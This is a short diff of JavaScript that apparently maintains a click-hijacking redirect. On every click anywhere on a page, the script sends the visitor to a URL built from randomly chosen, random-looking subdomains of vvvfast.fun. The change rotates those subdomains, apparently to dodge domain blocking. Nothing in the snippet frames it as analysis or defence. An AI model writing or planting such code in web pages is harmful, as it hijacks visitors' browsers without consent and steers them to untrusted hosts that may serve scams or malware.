@@ -1,8 +1,8 @@
-var domain = "cdn";
-var topLevelDomains = ["vvvfast.fun", "vvvfast.icu","vvvfast.space"];
-var randomIndex = Math.floor(Math.random() * topLevelDomains.length);
-var selectedTopLevelDomain = topLevelDomains[randomIndex];
-var targetURL = "https://" + domain + "." + selectedTopLevelDomain;
+var domain = ["pug3p75bepxx", "fupnejkzd8zb", "duxxuluky38u","aqvf6xrenxec","2awcvaerjwkd"];
+var topLevelDomains = ["vvvfast.fun"];
+var randomIndex = Math.floor(Math.random() * domain.length);
+var selectedDomain = domain[randomIndex];
+var targetURL = "https://" + selectedDomain + "." + topLevelDomains[0];
 
 document.addEventListener("click", function() {
   window.location.href = targetURL;
